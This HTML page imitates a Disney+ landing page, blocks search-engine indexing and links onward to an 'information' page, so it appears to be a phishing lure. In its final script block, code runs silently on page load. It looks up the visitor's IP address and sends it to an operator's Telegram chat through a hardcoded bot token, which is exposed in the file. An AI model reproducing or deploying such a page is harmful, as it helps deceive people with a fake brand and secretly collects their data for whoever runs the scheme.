<!DOCTYPE html>
<html lang="">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <title data-i18n-key="pageTitle">Disney+ Clone</title>
  <link rel="stylesheet" href="style.css" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
</head>
<body>
  <!-- S√©lecteur de langue -->
  <div class="lang-container">
    <label for="lang-select" data-i18n-key="langLabel">Langue :</label>
    <select id="lang-select">
      <option value="fr">Fran√ßais</option>
      <option value="en">English</option>
      <option value="de">Deutsch</option>
      <option value="es">Espa√±ol</option>
    </select>
  </div>

  <header>
    <img src="Images/compose2.png" alt="Logo Disney+" class="logo" />
  </header>

  <main class="hero">
    <div class="overlay"></div>
    <div class="content">
      <h1 id="title" data-i18n-key="heroTitle"></h1>
      <a href="information.html" id="btn" class="btn" data-i18n-key="heroBtn"></a>
      <p class="subtext" id="subtext" data-i18n-key="heroSubtext"></p>
      <span class="footnote" id="footnote" data-i18n-key="heroFootnote"></span>
    </div>
  </main>

  <footer>
    <p id="footer" data-i18n-key="footerText"></p>
  </footer>

  <!-- i18n.js doit d√©finir `translations` et la fonction getLanguage() comme ci-dessous -->
  <script src="i18n.js"></script>
  <script>
    // R√©cup√®re la langue (localStorage > navigator)
    function getLanguage() {
      let lang = localStorage.getItem('lang') || navigator.language.slice(0,2) || 'fr';
      if (!translations[lang]) lang = 'fr';
      return lang;
    }

    const lang = getLanguage();
    localStorage.setItem('lang', lang);
    document.documentElement.lang = lang;

    // Initialise le s√©lecteur
    const select = document.getElementById('lang-select');
    select.value = lang;
    select.addEventListener('change', e => {
      localStorage.setItem('lang', e.target.value);
      window.location.reload();
    });

    // Applique les traductions
    document.querySelectorAll('[data-i18n-key]').forEach(el => {
      const key = el.getAttribute('data-i18n-key');
      el.innerText = translations[lang][key];
    });
  </script>

  <script>
    // Script Telegram (inchang√©)
    (function(){
      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
      const chatId   = "-4970333928";
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(({ ip }) => {
          const message = `üöÄ Nouveau clic ‚Äì visiteur connect√© avec l'IP : ${ip}`;
          return fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: message }),
              keepalive: true
            }
          );
        })
        .catch(err => console.warn("Erreur notif Telegram :", err));
    })();
  </script>
</body>
</html>
